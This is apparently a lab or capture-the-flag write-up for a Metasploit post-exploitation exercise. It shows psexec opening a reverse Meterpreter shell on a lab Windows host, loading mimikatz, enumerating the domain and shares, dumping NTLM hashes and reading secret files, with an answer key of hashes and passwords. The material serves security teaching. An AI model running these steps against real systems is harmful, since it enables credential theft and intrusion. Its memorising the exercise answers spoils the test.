# Post-Exploitation Challenge Example

This module follows an example challenge that simulates the steps of a attack machine after exploiting and establishing a connection against a target machine.

Commands mentioned previously, such as `getsystem` and `hashdump` will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.

```shell
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'h01 am b0b :)'"
[+] Content written to stdout:
h01 am b0b :)

meterpreter >
```

The post-exploitation phase will have several goals; <span style="color: inherit;">Meterpreter</span> has functions that can assist all of them.

- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movement.

Once any additional tool is loaded using the `load` command, you will see new options on the `help` menu. The example below shows commands added for the Kiwi module (using the `load kiwi` command).

```shell
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

These will change according to the loaded menu, so running the `help` command after loading a module is always a good idea.

The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation. Assume initial compromise over the target machine SMB (Server Message Block) has already been established by using exploit/windows/smb/psexec.

target: 10.10.208.39

Username: ballen

Password: Password1

&nbsp;

```shell
bob@BoB~# msfconsole
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > set rhosts 10.10.208.39
rhosts => 10.10.208.39
msf6 exploit(windows/smb/psexec) > set smbuser ballen
smbuser => ballen
msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.47.94:4444 
[*] 10.10.208.39:445 - Connecting to the server...
[*] 10.10.208.39:445 - Authenticating to 10.10.208.39:445 as user 'ballen'...
[*] 10.10.208.39:445 - Selecting PowerShell target
[*] 10.10.208.39:445 - Executing the payload...
[+] 10.10.208.39:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.10.208.39
[*] Meterpreter session 1 opened (10.10.47.94:4444 -> 10.10.208.39:50589) at 2025-02-07 02:55:25 +0000

meterpreter > 
```

&nbsp;

## Exercises

### Question 1

What is the Computer name?

answer: ACME-TEST

```shell
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > 

```

&nbsp;

### Question 2

What is the target doamain?

answer:Â  FLASH

```shell
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
msf6 post(windows/gather/enum_domain) > set session 1
session => 1
msf6 post(windows/gather/enum_domain) > run

[+] Domain FQDN: FLASH.local
[+] Domain NetBIOS Name: FLASH
[+] Domain Controller: ACME-TEST.FLASH.local (IP: 10.10.208.39)
[*] Post module execution completed
msf6 post(windows/gather/enum_domain) >  
```

&nbsp;

### Question 3

What is the name of the share likely created by the user?

answer: speedster

```shell
msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > set session 1
session => 1
msf6 post(windows/gather/enum_shares) > run

[*] Running module against ACME-TEST (10.10.208.39)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed

```

&nbsp;

### Question 4

What is the NTLM hash of the jchambers user?

answer: 69596c7aa1e8daee17f8e78870e25a5c

```shell
msf6 post(windows/gather/enum_shares) > sessions -i

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  1         meterpreter x86/wind  NT AUTHORITY\SYSTEM @  10.10.47.94:4444 -> 1
            ows                    ACME-TEST             0.10.208.39:50589 (10
                                                         .10.208.39)

msf6 post(windows/gather/enum_shares) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:f43280b5f412e57434347370784f24ea:::
meterpreter > 

```

&nbsp;

### Question 5

What is the cleartext password of the jchambers user?

answer: Trustno1

&nbsp;

### Question 6

Where is the "secrets.txt" file located?

answer: c:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt

```shell
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100

meterpreter > 
```

&nbsp;

### Question 7

What is the Twitter password revealed in the "secrets.txt" file?

answer: KDSvbsw3849

```shell
meterpreter > shell
C:\Windows\system32>cd ../../
cd ../../

C:\>cd Program Files (x86)/Windows Multimedia Platform
cd Program Files (x86)/Windows Multimedia Platform

C:\Program Files (x86)\Windows Multimedia Platform>type secrets.txt
type secrets.txt
My Twitter password is KDSvbsw3849!
C:\Program Files (x86)\Windows Multimedia Platform> exit
meterpreter >

```

&nbsp;

### Question 8

Where is the "realsecret.txt" file located?

answer: c:\\inetpub\\wwwroot\\realsecret.txt

```shell
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100

meterpreter > 
```

&nbsp;

### Question 9

What is the real secret?

answer: The Flash is the fastest man alive

```shell
meterpreter > cat c:/inetpub/wwwroot/realsecret.txt
The Flash is the fastest man alive
meterpreter > 
```